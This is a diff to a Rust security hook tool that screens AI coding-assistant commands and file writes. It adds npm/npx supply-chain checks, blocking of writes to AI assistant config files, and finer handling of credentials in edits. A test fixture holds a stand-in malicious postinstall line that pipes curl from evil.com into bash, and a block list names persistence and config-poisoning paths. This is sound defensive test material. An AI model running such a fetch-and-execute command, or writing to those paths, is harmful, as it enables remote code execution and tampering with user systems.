@@ -20,7 +20,7 @@
 use crate::hooks::protocol::{HookDecision, HookInput, HookOutput};
 use crate::mcp::audit::McpAuditLog;
 use crate::mcp::policy::McpPolicy;
-use crate::redaction::redact_credentials;
+use crate::redaction::{redact_credentials, redact_credentials_no_entropy};
 
 /// Npm/JS package manager configuration for hook behaviour.
 ///
@@ -32,6 +32,8 @@ pub struct NpmConfig {
     pub watch_lifecycle: bool,
     /// Whether to suggest `--ignore-scripts` in pre-bash npm install warnings.
     pub ignore_scripts_warning: bool,
+    /// Whether to REQUIRE `--ignore-scripts` (block without it).
+    pub ignore_scripts_required: bool,
     /// Package names that skip slopsquatting checks (known-good packages).
     pub allowlist: Vec<String>,
 }
@@ -41,6 +43,7 @@ impl Default for NpmConfig {
         Self {
             watch_lifecycle: true,
             ignore_scripts_warning: true,
+            ignore_scripts_required: false,
             allowlist: Vec::new(),
         }
     }
@@ -86,6 +89,12 @@ fn extract_all_packages(command: &str) -> Vec<(String, Registry)> {
     let normalised = command.replace('\t', " ");
     let trimmed = normalised.trim();
 
+    // npx handling: `npx [-y] [--yes] [-p] [--package] <package>`
+    if let Some(rest) = trimmed.strip_prefix("npx ") {
+        let args = strip_npx_flags(rest.trim_start());
+        return parse_package_args(args, &Registry::Npm);
+    }
+
     // npm/pnpm/yarn/bun install patterns
     let npm_prefixes: &[&str] = &[
         "npm install ",
@@ -113,6 +122,32 @@ fn extract_all_packages(command: &str) -> Vec<(String, Registry)> {
     }
 
     Vec::new()
+}
+
+/// Strip npx-specific flags (`-y`, `--yes`, `-p`, `--package`) from the
+/// beginning of the argument string, returning the remainder starting at
+/// the first non-flag token.
+fn strip_npx_flags(args: &str) -> &str {
+    let npx_flags: &[&str] = &["-y", "--yes", "-p", "--package"];
+    let mut remaining = args;
+    loop {
+        remaining = remaining.trim_start();
+        let mut found_flag = false;
+        for flag in npx_flags {
+            if let Some(rest) = remaining.strip_prefix(flag) {
+                // Ensure the flag is a complete token (followed by space or end)
+                if rest.is_empty() || rest.starts_with(' ') || rest.starts_with('\t') {
+                    remaining = rest;
+                    found_flag = true;
+                    break;
+                }
+            }
+        }
+        if !found_flag {
+            break;
+        }
+    }
+    remaining
 }
 
 /// Parse package arguments from the portion after `install`, filtering flags.
@@ -808,6 +843,15 @@ const HIGH_RISK_WRITE_PATHS: &[&str] = &[
     "/cron",             // Scheduled execution persistence (crontab, cron.d, etc.)
     "/crontab",          // Scheduled execution persistence
     "/.config/systemd/", // Systemd autostart (boot persistence)
+    // AI assistant config dotfiles (prompt injection / MCP config poisoning)
+    "/.claude.json",
+    "/.claude/",
+    "/.cursor/mcp.json",
+    "/.cursor/mcp/",
+    "/.continue/config.json",
+    "/.continue/config/",
+    "/.windsurf/mcp.json",
+    "/.codeium/",
 ];
 
 /// Sensitive write destinations that warrant a warning (shell configuration
@@ -1189,6 +1233,213 @@ fn is_pip_install_command(normalised: &str) -> bool {
         || normalised.ends_with("pip3 install")
 }
 
+/// Fetch a package.json from the npm registry for pre-execution analysis.
+///
+/// Attempts to read from the local cache first (`$XDG_CACHE_HOME/sanctum/registry/`
+/// or `~/.cache/sanctum/registry/`). If the cache is missing or stale (>24 hours),
+/// fetches from `https://registry.npmjs.org/{name}/{version}` using `curl` with
+/// a 1-second timeout.
+///
+/// Returns `Ok(content)` on success, `Err(reason)` on failure. Failures are not
+/// fatal -- the caller should warn and continue.
+fn fetch_registry_package_json(name: &str, version: Option<&str>) -> Result<String, String> {
+    if !is_valid_curl_package_name(name) {
+        return Err(format!("invalid package name: {name}"));
+    }
+    let ver = version.unwrap_or("latest");
+    let cache_key = format!("{name}@{ver}.json");
+    let cache_dir = registry_cache_dir();
+
+    // Try cache first (TTL: 24 hours)
+    if let Some(ref dir) = cache_dir {
+        let cache_path = dir.join(&cache_key);
+        if let Ok(metadata) = std::fs::metadata(&cache_path) {
+            if let Ok(modified) = metadata.modified() {
+                if let Ok(elapsed) = modified.elapsed() {
+                    if elapsed.as_secs() < 86400 {
+                        if let Ok(cached) = std::fs::read_to_string(&cache_path) {
+                            return Ok(cached);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // Fetch from registry
+    let url = if ver == "latest" {
+        format!("https://registry.npmjs.org/{name}/latest")
+    } else {
+        format!("https://registry.npmjs.org/{name}/{ver}")
+    };
+
+    let result = std::process::Command::new("curl")
+        .args([
+            "-s",
+            "--max-time",
+            "1",
+            "--connect-timeout",
+            "1",
+            "--max-redirs",
+            "0",
+            &url,
+        ])
+        .output();
+
+    match result {
+        Ok(output) if output.status.success() => {
+            let body = String::from_utf8_lossy(&output.stdout).to_string();
+            // Write to cache (best-effort)
+            if let Some(ref dir) = cache_dir {
+                let _ = std::fs::create_dir_all(dir);
+                let cache_path = dir.join(&cache_key);
+                let _ = std::fs::write(&cache_path, &body);
+            }
+            Ok(body)
+        }
+        Ok(output) => Err(format!("curl returned status {}", output.status)),
+        Err(e) => Err(format!("curl not available: {e}")),
+    }
+}
+
+/// Return the registry cache directory path.
+fn registry_cache_dir() -> Option<std::path::PathBuf> {
+    let base = std::env::var("XDG_CACHE_HOME")
+        .ok()
+        .filter(|s| !s.is_empty())
+        .or_else(|| {
+            std::env::var("HOME")
+                .ok()
+                .map(|h| format!("{h}/.cache"))
+        })?;
+    Some(std::path::PathBuf::from(base).join("sanctum/registry"))
+}
+
+/// Run `check_patterns()` from the sentinel npm scanner on registry package.json
+/// content. Returns warnings/blocks based on risk level.
+fn analyze_registry_package(
+    name: &str,
+    pkg_json_content: &str,
+) -> Option<(sanctum_sentinel::npm::scanner::RiskLevel, Vec<String>)> {
+    let pkg: serde_json::Value = serde_json::from_str(pkg_json_content).ok()?;
+    let scripts = pkg.get("scripts")?.as_object()?;
+
+    let lifecycle_keys = [
+        "preinstall", "install", "postinstall", "preuninstall", "uninstall",
+        "postuninstall", "prepublish", "preprepare", "prepare", "postprepare",
+        "prepack", "postpack",
+    ];
+
+    let mut max_risk = sanctum_sentinel::npm::scanner::RiskLevel::Low;
+    let mut messages = Vec::new();
+
+    for key in &lifecycle_keys {
+        if let Some(script_val) = scripts.get(*key) {
+            if let Some(script_str) = script_val.as_str() {
+                let findings = sanctum_sentinel::npm::scanner::check_patterns(
+                    script_str,
+                    &format!("{name}:scripts.{key}"),
+                );
+                for finding in &findings {
+                    if finding.level > max_risk {
+                        max_risk = finding.level;
+                    }
+                    messages.push(format!(
+                        "Package \'{name}\' scripts.{key}: {} (risk: {})",
+                        finding.pattern, finding.level
+                    ));
+                }
+            }
+        }
+    }
+
+    if messages.is_empty() {
+        None
+    } else {
+        Some((max_risk, messages))
+    }
+}
+
+/// Pre-execution analysis of npm packages: fetch package.json from registry
+/// and run scanner patterns. Returns warnings or blocks.
+///
+/// Skips bare `npm install` (no explicit packages). Uses `thread::scope`
+/// for parallel fetches (capped at 4 concurrent via simple counter).
+fn pre_analyze_npm_packages(packages: &[(String, Registry)]) -> Vec<HookOutput> {
+    use std::sync::{Arc, Mutex};
+
+    let npm_pkgs: Vec<&str> = packages
+        .iter()
+        .filter(|(_, r)| *r == Registry::Npm)
+        .map(|(name, _)| name.as_str())
+        .collect();
+
+    if npm_pkgs.is_empty() {
+        return Vec::new();
+    }
+
+    let results: Arc<Mutex<Vec<HookOutput>>> = Arc::new(Mutex::new(Vec::new()));
+
+    // Process in batches of 4 to limit concurrency
+    for chunk in npm_pkgs.chunks(4) {
+        std::thread::scope(|s| {
+            let handles: Vec<_> = chunk
+                .iter()
+                .map(|name| {
+                    let results = results.clone();
+                    s.spawn(move || {
+                        let fetch_result = fetch_registry_package_json(name, None);
+                        match fetch_result {
+                            Ok(body) => {
+                                if let Some((risk, messages)) =
+                                    analyze_registry_package(name, &body)
+                                {
+                                    let output = match risk {
+                                        sanctum_sentinel::npm::scanner::RiskLevel::Critical
+                                        | sanctum_sentinel::npm::scanner::RiskLevel::High => {
+                                            HookOutput::block(format!(
+                                                "Blocked: package \'{name}\' has suspicious lifecycle scripts:\\n{}",
+                                                messages.join("\\n")
+                                            ))
+                                        }
+                                        sanctum_sentinel::npm::scanner::RiskLevel::Medium => {
+                                            HookOutput::warn(format!(
+                                                "Warning: package \'{name}\' has suspicious lifecycle scripts:\\n{}",
+                                                messages.join("\\n")
+                                            ))
+                                        }
+                                        sanctum_sentinel::npm::scanner::RiskLevel::Low => return,
+                                    };
+                                    if let Ok(mut r) = results.lock() {
+                                        r.push(output);
+                                    }
+                                }
+                            }
+                            Err(reason) => {
+                                if let Ok(mut r) = results.lock() {
+                                    r.push(HookOutput::warn(format!(
+                                        "Warning: could not fetch registry metadata for \'{name}\': {reason}"
+                                    )));
+                                }
+                            }
+                        }
+                    })
+                })
+                .collect();
+
+            for handle in handles {
+                let _ = handle.join();
+            }
+        });
+    }
+
+    // unwrap is safe here because we hold the only Arc and all threads have joined
+    Arc::try_unwrap(results)
+        .ok()
+        .and_then(|m| m.into_inner().ok())
+        .unwrap_or_default()
+}
+
 /// Evaluate a pre-bash hook.
 ///
 /// - **BLOCK**: Reading credential files (via direct or indirect commands,
@@ -1384,11 +1635,27 @@ pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> Ho
             }
         }
 
+        // Task 5: Block if ignore_scripts_required and --ignore-scripts is missing.
+        if is_npm_install
+            && npm_config.ignore_scripts_required
+            && !packages.is_empty()
+            && !normalised.contains("--ignore-scripts")
+        {
+            return HookOutput::block(
+                "Blocked: npm install without --ignore-scripts is not permitted \
+                 when ignore_scripts_required is enabled\n\
+                 To proceed: add --ignore-scripts to the command"
+                    .to_owned(),
+            );
+        }
+
         // If we got here with no packages extracted, it might be a bare install
         // from lockfile (e.g., `npm install`, `pip install .`), or packages
         // were all allowlisted. Just check for ignore-scripts suggestion.
+        // Skip the soft tip when ignore_scripts_required is already enforcing.
         if is_npm_install
             && npm_config.ignore_scripts_warning
+            && !npm_config.ignore_scripts_required
             && !packages.is_empty()
             && !normalised.contains("--ignore-scripts")
         {
@@ -1402,9 +1669,29 @@ pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> Ho
             return HookOutput::warn(warnings.join("\n"));
         }
 
+        // Task 6: Pre-execution package.json analysis for npm packages.
+        // Skip for bare `npm install` / `npm ci` (no explicit packages).
+        if is_npm_install && !packages.is_empty() {
+            let analysis_results = pre_analyze_npm_packages(&packages);
+            for result in &analysis_results {
+                if result.decision == HookDecision::Block {
+                    return result.clone();
+                }
+            }
+            // Collect warnings from analysis
+            for result in analysis_results {
+                if let Some(msg) = result.message {
+                    warnings.push(msg);
+                }
+            }
+        }
+
         // M16: If all packages were verified or this is a bare install,
         // proceed without the generic pip install warning.
         if !packages.is_empty() {
+            if !warnings.is_empty() {
+                return HookOutput::warn(warnings.join("\n"));
+            }
             return HookOutput::allow();
         }
     }
@@ -1481,30 +1768,119 @@ pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> Ho
 /// Maximum recursion depth for scanning JSON values for credentials.
 const MAX_CREDENTIAL_SCAN_DEPTH: usize = 8;
 
+/// JSON key names where high-entropy strings are expected and benign.
+///
+/// When the parent key matches one of these patterns (case-insensitive),
+/// the entropy-based fallback in `redact_credentials` is skipped.
+/// Pattern-based detection still runs, so real credentials (e.g. `sk-proj-...`)
+/// under a hash key are still caught.
+const ENTROPY_EXEMPT_KEY_PATTERNS: &[&str] = &[
+    "hash", "digest", "checksum", "nonce", "uuid", "id", "image",
+    "cert", "certificate", "signature", "commit", "ref", "etag",
+    "fingerprint",
+];
+
+/// Returns `true` if `key` matches one of the entropy-exempt patterns.
+///
+/// Also matches keys with numeric suffixes like `sha256`, `sha512`,
+/// `token_id`, `request_id`, `trace_id`.
+fn is_entropy_exempt_key(key: &str) -> bool {
+    if key.is_empty() {
+        return false;
+    }
+    let lower = key.to_ascii_lowercase();
+    // Direct matches
+    for &pat in ENTROPY_EXEMPT_KEY_PATTERNS {
+        if lower == pat {
+            return true;
+        }
+    }
+    // sha + optional digits (sha256, sha512, sha1, etc.)
+    if lower.starts_with("sha") && lower[3..].chars().all(|c| c.is_ascii_digit()) {
+        return true;
+    }
+    // Compound key patterns: token_id, request_id, trace_id
+    if lower == "token_id" || lower == "request_id" || lower == "trace_id" {
+        return true;
+    }
+    false
+}
+
+/// A credential finding with its source key context.
+#[derive(Debug, Clone)]
+struct CredentialFinding {
+    /// The credential type (e.g. `OpenAI API Key`).
+    credential_type: String,
+    /// The JSON key where the credential was found (e.g. `old_string`, `new_string`).
+    source_key: String,
+}
+
 /// Recursively collect credential types from all string values in a JSON value.
 ///
 /// Scans `content`, `new_string`, `old_string`, and any nested structures
 /// including `operations` arrays in `MultiEdit` format. Skips non-content keys
 /// like `file_path`, `path`, `command` to avoid false positives.
+///
+/// Now also tracks WHICH key contained the credential so callers can
+/// distinguish between `old_string`-only and `new_string` credentials.
+#[allow(dead_code)]
 fn collect_credential_types(value: &serde_json::Value, out: &mut Vec<String>, depth: usize) {
+    let mut findings = Vec::new();
+    collect_credential_findings(value, &mut findings, depth, "");
+    for f in &findings {
+        if !out.contains(&f.credential_type) {
+            out.push(f.credential_type.clone());
+        }
+    }
+}
+
+/// Keys that contain content being REMOVED (the text being replaced).
+/// Credentials in these keys only are less dangerous -- the edit is removing them.
+const OLD_STRING_KEYS: &[&str] = &["old_string"];
+
+/// Returns true if ALL credential findings are exclusively in `old_string`
+/// positions (not in `new_string`, `content`, or `operations[].new_string`).
+fn credentials_only_in_old_string(findings: &[CredentialFinding]) -> bool {
+    if findings.is_empty() {
+        return false;
+    }
+    findings.iter().all(|f| OLD_STRING_KEYS.contains(&f.source_key.as_str()))
+}
+
+/// Recursively collect credential findings with key context from JSON values.
+///
+/// Tracks the parent key name so that callers can determine whether
+/// credentials appeared only in `old_string` (removal) or in `new_string`/`content`
+/// (introduction).
+fn collect_credential_findings(
+    value: &serde_json::Value,
+    out: &mut Vec<CredentialFinding>,
+    depth: usize,
+    current_key: &str,
+) {
     if depth > MAX_CREDENTIAL_SCAN_DEPTH {
         return;
     }
     match value {
         serde_json::Value::String(s) => {
             if !s.is_empty() {
-                let (_, events) = redact_credentials(s);
+                let skip_entropy = is_entropy_exempt_key(current_key);
+                let (_, events) = if skip_entropy {
+                    redact_credentials_no_entropy(s)
+                } else {
+                    redact_credentials(s)
+                };
                 for event in &events {
-                    let ctype = event.credential_type.as_str().to_owned();
-                    if !out.contains(&ctype) {
-                        out.push(ctype);
-                    }
+                    out.push(CredentialFinding {
+                        credential_type: event.credential_type.clone(),
+                        source_key: current_key.to_owned(),
+                    });
                 }
             }
         }
         serde_json::Value::Array(arr) => {
             for item in arr {
-                collect_credential_types(item, out, depth + 1);
+                collect_credential_findings(item, out, depth + 1, current_key);
             }
         }
         serde_json::Value::Object(map) => {
@@ -1515,7 +1891,7 @@ fn collect_credential_types(value: &serde_json::Value, out: &mut Vec<String>, de
                 if SKIP_KEYS.contains(&key.as_str()) {
                     continue;
                 }
-                collect_credential_types(val, out, depth + 1);
+                collect_credential_findings(val, out, depth + 1, key.as_str());
             }
         }
         _ => {}
@@ -1577,9 +1953,25 @@ pub fn pre_write(input: &HookInput) -> HookOutput {
     // pre_bash credential blocking is already unconditional, and config hardening
     // forces the flag to true anyway.
     {
-        let mut credential_types = Vec::new();
-        collect_credential_types(&input.tool_input, &mut credential_types, 0);
-        if !credential_types.is_empty() {
+        let mut findings = Vec::new();
+        collect_credential_findings(&input.tool_input, &mut findings, 0, "");
+        if !findings.is_empty() {
+            let credential_types: Vec<String> = {
+                let mut types = Vec::new();
+                for f in &findings {
+                    if !types.contains(&f.credential_type) {
+                        types.push(f.credential_type.clone());
+                    }
+                }
+                types
+            };
+            if credentials_only_in_old_string(&findings) {
+                return HookOutput::warn(format!(
+                    "Warning: edit removes content containing detected credentials: {}\n\
+                     Verify the replacement text is safe before proceeding.",
+                    credential_types.join(", ")
+                ));
+            }
             return HookOutput::block(format!(
                 "Blocked: file content contains detected credentials: {}\n\
                  To proceed: verify and run this command directly in your terminal (outside Claude Code)",
@@ -1927,6 +2319,7 @@ pub fn post_bash(input: &HookInput) -> HookOutput {
 
 /// Inner post-bash handler that also accepts npm configuration.
 #[must_use]
+#[allow(clippy::too_many_lines)]
 pub fn post_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> HookOutput {
     if let Some(ref cfg) = input.config {
         if !cfg.claude_hooks {
@@ -2035,6 +2428,41 @@ pub fn post_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> H
              Review postinstall/preinstall scripts for unexpected behaviour."
                 .to_owned(),
         );
+    }
+
+    // 8. Task 7: Post-install scanner integration for npm packages.
+    // When an npm install command completes, scan installed package.json
+    // files in node_modules for suspicious patterns.
+    if is_npm_install_command(&normalised_cmd) {
+        let packages = extract_all_packages(command);
+        let cwd = input
+            .tool_input
+            .get("cwd")
+            .and_then(serde_json::Value::as_str)
+            .unwrap_or(".");
+
+        for (pkg_name, registry) in &packages {
+            if *registry != Registry::Npm {
+                continue;
+            }
+            let pkg_dir = std::path::Path::new(cwd)
+                .join("node_modules")
+                .join(pkg_name);
+            if pkg_dir.exists() {
+                let scan_result = sanctum_sentinel::npm::scanner::scan_package(&pkg_dir);
+                if scan_result.risk >= sanctum_sentinel::npm::scanner::RiskLevel::Medium {
+                    for finding in &scan_result.findings {
+                        warnings.push(format!(
+                            "Installed package '{pkg_name}' scanner finding: {} (risk: {})",
+                            finding.pattern, finding.level
+                        ));
+                    }
+                }
+                for warning in &scan_result.warnings {
+                    tracing::warn!(package = %pkg_name, warning = %warning, "npm scanner warning");
+                }
+            }
+        }
     }
 
     if warnings.is_empty() {
@@ -3936,7 +4364,7 @@ mod tests {
     }
 
     #[test]
-    fn pre_write_blocks_credentials_in_old_string() {
+    fn pre_write_warns_credentials_in_old_string_only() {
         let input = make_input(
             "write",
             json!({
@@ -3945,7 +4373,8 @@ mod tests {
             }),
         );
         let output = pre_write(&input);
-        assert_eq!(output.decision, HookDecision::Block);
+        assert_eq!(output.decision, HookDecision::Warn);
+        assert!(output.message.as_deref().unwrap_or("").contains("removes content"));
     }
 
     #[test]
@@ -5796,6 +6225,89 @@ mod tests {
 
     // ---- Fix 3: check_package_existence config wiring ----
 
+    // ---- Task 1: AI config dotfile write protection ----
+
+    #[test]
+    fn pre_write_blocks_claude_json() {
+        let input = make_input(
+            "write",
+            json!({ "file_path": "/home/user/.claude.json", "content": "{}" }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Block);
+        assert!(output.message.as_deref().unwrap_or("").contains("high-risk persistence path"));
+    }
+
+    #[test]
+    fn pre_write_blocks_claude_settings() {
+        let input = make_input(
+            "write",
+            json!({ "file_path": "/home/user/.claude/settings.json", "content": "{}" }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
+    #[test]
+    fn pre_write_blocks_cursor_mcp_json() {
+        let input = make_input(
+            "write",
+            json!({ "file_path": "/home/user/.cursor/mcp.json", "content": "{}" }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
+    #[test]
+    fn pre_write_blocks_cursor_mcp_subdir() {
+        let input = make_input(
+            "write",
+            json!({ "file_path": "/home/user/.cursor/mcp/server.json", "content": "{}" }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
+    #[test]
+    fn pre_write_blocks_continue_config_json() {
+        let input = make_input(
+            "write",
+            json!({ "file_path": "/home/user/.continue/config.json", "content": "{}" }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
+    #[test]
+    fn pre_write_blocks_continue_config_subdir() {
+        let input = make_input(
+            "write",
+            json!({ "file_path": "/home/user/.continue/config/mcp.json", "content": "{}" }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
+    #[test]
+    fn pre_write_blocks_windsurf_mcp_json() {
+        let input = make_input(
+            "write",
+            json!({ "file_path": "/home/user/.windsurf/mcp.json", "content": "{}" }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
+    #[test]
+    fn pre_write_blocks_codeium_dir() {
+        let input = make_input(
+            "write",
+            json!({ "file_path": "/home/user/.codeium/config.json", "content": "{}" }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
     #[test]
     fn pre_bash_skips_package_check_when_disabled() {
         let mut input = make_input(
@@ -5909,12 +6421,334 @@ mod expanded_claude_tests {
         }
     }
 
+    // ---- Task 2: old_string credential warn-not-block tests ----
+
     #[test]
-    fn extract_all_packages_does_not_handle_npx() {
-        let packages = extract_all_packages("npx some-package-name");
-        assert!(
-            packages.is_empty(),
-            "extract_all_packages does not yet handle npx"
+    fn pre_write_blocks_credential_in_new_string_only() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/tmp/config.yaml",
+                "new_string": "api_key: sk-abcdefghijklmnopqrstuvwxyz"
+            }),
         );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
+    #[test]
+    fn pre_write_blocks_credential_in_both_old_and_new() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/tmp/config.yaml",
+                "old_string": "api_key: sk-abcdefghijklmnopqrstuvwxyz",
+                "new_string": "api_key: sk-anotherfakevaluehere123456"
+            }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
+    #[test]
+    fn pre_write_warns_credential_only_in_old_string() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/tmp/config.yaml",
+                "old_string": "api_key: sk-abcdefghijklmnopqrstuvwxyz",
+                "new_string": "api_key: <redacted>"
+            }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Warn);
+    }
+
+    #[test]
+    fn pre_write_warns_multiedit_credential_only_in_old_string() {
+        let input = make_test_input(
+            "MultiEdit",
+            json!({
+                "file_path": "config.py",
+                "operations": [
+                    {
+                        "old_string": "key = sk-abcdefghijklmnopqrstuvwxyz",
+                        "new_string": "key = <placeholder>"
+                    }
+                ]
+            }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Warn);
+    }
+
+    #[test]
+    fn pre_write_blocks_multiedit_credential_in_new_string() {
+        let input = make_test_input(
+            "MultiEdit",
+            json!({
+                "file_path": "config.py",
+                "operations": [
+                    {
+                        "old_string": "placeholder",
+                        "new_string": "key = sk-abcdefghijklmnopqrstuvwxyz"
+                    }
+                ]
+            }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
+    // ---- Task 3: npx slopsquatting handling ----
+
+    #[test]
+    fn extract_all_packages_handles_npx() {
+        let packages = extract_all_packages("npx some-package-name");
+        assert_eq!(packages.len(), 1);
+        assert_eq!(packages[0].0, "some-package-name");
+        assert_eq!(packages[0].1, Registry::Npm);
+    }
+
+    #[test]
+    fn extract_all_packages_handles_npx_scoped() {
+        let packages = extract_all_packages("npx @scope/pkg");
+        assert_eq!(packages.len(), 1);
+        assert_eq!(packages[0].0, "@scope/pkg");
+    }
+
+    #[test]
+    fn extract_all_packages_handles_npx_with_version() {
+        let packages = extract_all_packages("npx pkg@1.0");
+        assert_eq!(packages.len(), 1);
+        assert_eq!(packages[0].0, "pkg");
+    }
+
+    #[test]
+    fn extract_all_packages_handles_npx_dash_y() {
+        let packages = extract_all_packages("npx -y pkg");
+        assert_eq!(packages.len(), 1);
+        assert_eq!(packages[0].0, "pkg");
+    }
+
+    #[test]
+    fn extract_all_packages_handles_npx_yes() {
+        let packages = extract_all_packages("npx --yes @scope/pkg@2");
+        assert_eq!(packages.len(), 1);
+        assert_eq!(packages[0].0, "@scope/pkg");
+    }
+
+    // ---- Task 4: Context-aware entropy exemption tests ----
+
+    #[test]
+    fn context_aware_entropy_skips_sha256_key() {
+        let hex_hash = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2";
+        let json_str = format!(r#"{{"sha256": "{hex_hash}"}}"#);
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/tmp/lockfile.json",
+                "content": json_str
+            }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Allow);
+    }
+
+    #[test]
+    fn context_aware_entropy_still_detects_pattern_credential() {
+        let input = make_test_input(
+            "write",
+            json!({
+                "file_path": "/tmp/config.json",
+                "content": format!(r#"{{"hash": "{}"}}"#, "sk-abcdefghijklmnopqrstuvwxyz")
+            }),
+        );
+        let output = pre_write(&input);
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
+    #[test]
+    fn is_entropy_exempt_key_matches() {
+        assert!(is_entropy_exempt_key("sha256"));
+        assert!(is_entropy_exempt_key("SHA256"));
+        assert!(is_entropy_exempt_key("sha512"));
+        assert!(is_entropy_exempt_key("sha1"));
+        assert!(is_entropy_exempt_key("digest"));
+        assert!(is_entropy_exempt_key("checksum"));
+        assert!(is_entropy_exempt_key("nonce"));
+        assert!(is_entropy_exempt_key("uuid"));
+        assert!(is_entropy_exempt_key("fingerprint"));
+        assert!(is_entropy_exempt_key("token_id"));
+        assert!(is_entropy_exempt_key("request_id"));
+        assert!(is_entropy_exempt_key("trace_id"));
+        assert!(is_entropy_exempt_key("commit"));
+        assert!(is_entropy_exempt_key("etag"));
+    }
+
+    #[test]
+    fn is_entropy_exempt_key_rejects() {
+        assert!(!is_entropy_exempt_key("api_key"));
+        assert!(!is_entropy_exempt_key("secret"));
+        assert!(!is_entropy_exempt_key("password"));
+        assert!(!is_entropy_exempt_key(""));
+    }
+
+    // ---- Task 5: --ignore-scripts enforcement tests ----
+
+    #[test]
+    fn pre_bash_blocks_npm_install_without_ignore_scripts_when_required() {
+        let npm_config = NpmConfig {
+            ignore_scripts_required: true,
+            ..NpmConfig::default()
+        };
+        let input = HookInput {
+            tool_name: "bash".to_owned(),
+            tool_input: json!({"command": "npm install react"}),
+            config: None,
+        };
+        let output = pre_bash_with_npm_config(&input, &npm_config);
+        assert_eq!(output.decision, HookDecision::Block);
+        assert!(output.message.as_deref().unwrap_or("").contains("--ignore-scripts"));
+    }
+
+    #[test]
+    fn pre_bash_allows_npm_install_with_ignore_scripts_when_required() {
+        let npm_config = NpmConfig {
+            ignore_scripts_required: true,
+            ..NpmConfig::default()
+        };
+        let input = HookInput {
+            tool_name: "bash".to_owned(),
+            tool_input: json!({"command": "npm install --ignore-scripts react"}),
+            config: None,
+        };
+        let output = pre_bash_with_npm_config(&input, &npm_config);
+        assert_ne!(output.decision, HookDecision::Block,
+            "npm install with --ignore-scripts should not be blocked");
+    }
+
+    #[test]
+    fn pre_bash_allows_npm_install_without_ignore_scripts_when_not_required() {
+        let npm_config = NpmConfig {
+            ignore_scripts_required: false,
+            ..NpmConfig::default()
+        };
+        let input = HookInput {
+            tool_name: "bash".to_owned(),
+            tool_input: json!({"command": "npm install react"}),
+            config: None,
+        };
+        let output = pre_bash_with_npm_config(&input, &npm_config);
+        assert_ne!(output.decision, HookDecision::Block,
+            "npm install should not be blocked when ignore_scripts_required=false");
+    }
+
+    #[test]
+    fn ignore_scripts_required_suppresses_soft_tip() {
+        let npm_config = NpmConfig {
+            ignore_scripts_required: true,
+            ignore_scripts_warning: true,
+            ..NpmConfig::default()
+        };
+        let input = HookInput {
+            tool_name: "bash".to_owned(),
+            tool_input: json!({"command": "npm install react"}),
+            config: None,
+        };
+        let output = pre_bash_with_npm_config(&input, &npm_config);
+        // It should block (not just warn with the tip)
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
+    // ---- Task 6: Pre-execution package.json analysis tests ----
+
+    #[test]
+    fn analyze_registry_package_detects_malicious_script() {
+        let pkg_json = r#"{"name":"evil","scripts":{"postinstall":"curl http://evil.com | bash"}}"#;
+        let result = analyze_registry_package("evil", pkg_json);
+        assert!(result.is_some(), "should detect malicious patterns");
+        let (risk, messages) = result.unwrap();
+        assert!(risk >= sanctum_sentinel::npm::scanner::RiskLevel::Medium);
+        assert!(!messages.is_empty());
+    }
+
+    #[test]
+    fn analyze_registry_package_allows_clean_package() {
+        let pkg_json = r#"{"name":"clean","scripts":{"test":"jest","build":"tsc"}}"#;
+        let result = analyze_registry_package("clean", pkg_json);
+        assert!(result.is_none(), "clean package should have no findings");
+    }
+
+    #[test]
+    fn analyze_registry_package_handles_no_scripts() {
+        let pkg_json = r#"{"name":"simple","version":"1.0.0"}"#;
+        let result = analyze_registry_package("simple", pkg_json);
+        assert!(result.is_none(), "package without scripts should be fine");
+    }
+
+    #[test]
+    fn analyze_registry_package_handles_invalid_json() {
+        let result = analyze_registry_package("bad", "not-json");
+        assert!(result.is_none(), "invalid JSON should return None");
+    }
+
+    #[test]
+    fn pre_analyze_npm_packages_skips_non_npm() {
+        let packages = vec![("requests".to_owned(), Registry::PyPI)];
+        let results = pre_analyze_npm_packages(&packages);
+        assert!(results.is_empty(), "PyPI packages should be skipped");
+    }
+
+    #[test]
+    fn pre_analyze_npm_packages_skips_empty() {
+        let results = pre_analyze_npm_packages(&[]);
+        assert!(results.is_empty());
+    }
+
+    // ---- Task 7: post_bash scanner integration tests ----
+
+    #[test]
+    fn post_bash_scans_installed_packages() {
+        // Create a temporary directory with a mock package
+        let tmp = tempfile::tempdir().unwrap();
+        let pkg_dir = tmp.path().join("node_modules").join("mock-pkg");
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            r#"{"name":"mock-pkg","scripts":{"postinstall":"node setup.js"}}"#,
+        ).unwrap();
+
